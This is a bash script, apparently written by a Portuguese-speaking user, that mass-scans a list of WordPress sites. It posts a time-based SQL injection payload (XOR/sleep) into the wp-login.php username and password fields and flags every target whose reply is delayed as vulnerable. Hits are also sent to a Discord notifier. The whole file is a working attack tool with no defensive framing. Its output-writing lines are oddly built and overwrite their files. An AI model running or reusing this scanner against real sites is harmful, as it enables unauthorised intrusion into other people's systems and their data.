#!/bin/bash
wordlist="$1"

for url in $(cat $wordlist) ;do TIME=$({ time curl -v -sk -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "log=0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z&pwd=0%27XOR%28if%28now%28%29%3Dsysdate%28%29%2Csleep%2815%29%2C0%29%29XOR%27Z+%3D%3E&g-recaptcha-response=03AGdBq25b-W6tugq-xMA5r4HA1FJJX1uDMve1fZXKK0wtp2SxW745D7MwrwsXYpIQtRFHR4cMPxIWp5nTWRR89A4LGaom7kVvG7eMiPGe2z-rQIAM9oAd2Anp5_RBkg9tTndCyHlFh1cMUZKTtq-eF1yEI_Ixi7c6-xkDrqvs0Kb5DEZ_eu9SWNnm_evtbW0XXtz8pI7ipHNzw5icYUn6LmxkbxmyqfyQ5j4ZaPGnoPvtS2huSZKyN9RoVBL-v9UHs8Zdkj1dcVvVwurhVCNjBBFPTnZeA-D1iYSp_kqtfLzW1d84F-9p09Tw9bp7qlirNa-UFSKnWxY27c6oAw5_p649TgBzLQMY4-bMK0_2bbqOv1RIy2vhqIXjpeh6r8l4-MAHHgllF0iW2ClpXKn5Y95DSg2muoc-zzdQ5xE2cpLL3Gw71nNITafbIC2QEKyyS-QBk8h1dn&wp-submit=P%C5%99ihl%C3%A1sit+se&redirect_to=$url%2Fwp-admin%2F&testcookie=1" "$url/wp-login.php" >/dev/null;}  |&  grep "real" | cut -d "." -f1 | cut -d "m" -f2)


echo "$TIME"

if (( "$TIME" >= "10" )); then


        echo -e "Url  \e[36m${url} \e[0m Status  => \e[32m é VULNERAVEL A SQLI TIME BASED \e[0m" | notify -discord-username SQLITIMEBASED

        var2=$(echo "https://t.me/joinchat/$url" > valuedinvalues.txt)
else
        echo -e "Url  \e[36m${url} \e[0m Status  => \e[31m não É VULNERAVEL A SQLI TIME BASED \e[0m"
        var1=$(echo "https://t.me/joinchat/$url" > validvalues.txt)

fi

done
